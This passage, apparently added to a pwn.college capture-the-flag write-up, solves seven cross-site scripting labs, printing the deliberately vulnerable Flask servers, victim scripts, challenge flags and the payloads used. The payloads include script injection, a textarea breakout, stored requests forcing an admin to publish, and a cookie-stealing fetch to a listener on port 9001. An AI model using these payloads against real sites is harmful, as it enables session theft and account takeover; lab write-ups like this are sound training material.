@@ -1236,3 +1236,343 @@ We used `GLOB` because `LIKE` in SQLite is sadly case insensitive.
 hacker@web-security~sqli-5:~$ python sqli5_blind.py
 pwn.college{ADlaLjN2akH0reK_2skqxAVxXET.QXzkzMzwyMyITOyEzW}
 ```
+
+## XSS 1
+
+```python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+# /challenge/server
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")
+
+
+@app.route("/", methods=["POST"])
+def challenge_post():
+    content = flask.request.form.get("content", "")
+    db.execute("INSERT INTO posts VALUES (?)", [content])
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
+    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"
+
+    for post in db.execute("SELECT content FROM posts").fetchall():
+        page += "<hr>" + post["content"] + "\n"
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+# /challenge/victim
+
+import requests
+import psutil
+import sys
+import re
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+challenge_url = "http://challenge.localhost:80/"
+flag = open("/flag").read().strip()
+
+print(f"Visiting {challenge_url}...")
+try:
+    num_inputs = len(re.findall(r"<input[^<]*>", requests.get(challenge_url, timeout=1).text))
+    if num_inputs <= 2:
+        print("You did not inject an <input> textbox...")
+    else:
+        print("You got it! Here is your flag:")
+        print(flag)
+except requests.exceptions.ConnectionError:
+    print("Connection error... Is the service running?")
+```
+
+Just submit three `<input></input>`.
+
+![](fig/xss1.png)
+
+Flag: `pwn.college{A5tb6Kd9UrQeTQ2JteR9zDzchi9.QX1cTN2wyMyITOyEzW}`
+
+## XSS 2
+
+![](fig/xss2.png)
+
+Submit `<script>alert("PWNED")</script>`.
+
+Flag: `pwn.college{8XGBHA0aqgMcUA54D4CeTnUL0kK.QX3cTN2wyMyITOyEzW}`
+
+## XSS 3
+
+![](fig/xss3.png)
+
+Flag: `pwn.college{4XvDQHaf0eEGtZXTXOdpXiMJRzb.QX0kzMzwyMyITOyEzW}`
+
+```
+/challenge/victim 'http://challenge.localhost/?msg=%3Cscript%3Ealert(%22PWNED%22)%3C/script%3E'
+```
+
+## XSS 4
+
+![](fig/xss4.png)
+
+Insert `</textarea><script>alert("PWNED")</script>`.
+
+Flag: `pwn.college{kgaedczaA-PBF2PWs53OQE1L6qw.QX1kzMzwyMyITOyEzW}`
+
+## XSS 5
+
+```python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+# /challenge/server 
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["GET"])
+def challenge_publish():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username = flask.session.get("username", None)
+    if username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```python
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+# /challenge/victim
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+challenge_url = "http://challenge.localhost:80/"
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+
+browser.find_element(By.NAME, "username").send_keys("admin")
+browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip())
+browser.find_element(By.NAME, "submit").submit()
+
+time.sleep(2)
+print("Visited! Go check if the attack worked!")
+```
+
+![](fig/xss5.png)
+
+Log in with `guest:password`.
+
+Insert, mark the `Publish` checkbox and Submit:
+```html
+<script>fetch("http://challenge.localhost/publish")</script>
+```
+
+When the victim visits the URL, the Stored XSS will make a request to publish all their posts.
+
+Flag: `pwn.college{UQTfwrydITo0GrJls1HsStm_ew7.QX2kzMzwyMyITOyEzW}`
+
+## XSS 6
+
+Now we have to make a `POST` request with the JavaScript `fetch` API.
+
+The payload is
+```html
+<script>fetch("http://challenge.localhost/publish",{method:"post"})</script>
+```
+
+![](fig/xss6.png)
+
+Flag: `pwn.college{EfLhUk36em84aDsC_1vIJod8_Vu.QXwgTN2wyMyITOyEzW}`
+
+## XSS 7
+
+Now we need to make a request to steal the victim's cookies.
+
+The cookie name seems to be `auth`.
+
+![](fig/xss7_cookie.png)
+
+So our payload (we base64 encode the cookie) will be
+```
+<script>fetch(`http://127.0.0.1:9001/${btoa(document.cookie)}`)</script>
+```
+
+![](fig/xss7_steal.png)
+
+On the `python -m http.server 9001` listener, we get the cookie `YXV0aD1hZG1pbnwuUVh5Z1ROMnd5TXlJVE95RXpXfQ==`
+
+```
+hacker@web-security~xss-7:~$ echo -n "YXV0aD1hZG1pbnwuUVh5Z1ROMnd5TXlJVE95RXpXfQ==" | base64 -d
+auth=admin|.QXygTN2wyMyITOyEzW}
+```
+
+We insert the cookie and get the admin session:
+
+![](fig/xss7_admin_session.png)
+
+Flag: `pwn.college{IfVyqL8XKGwK7AM8CT-696xmGny.QXygTN2wyMyITOyEzW}`
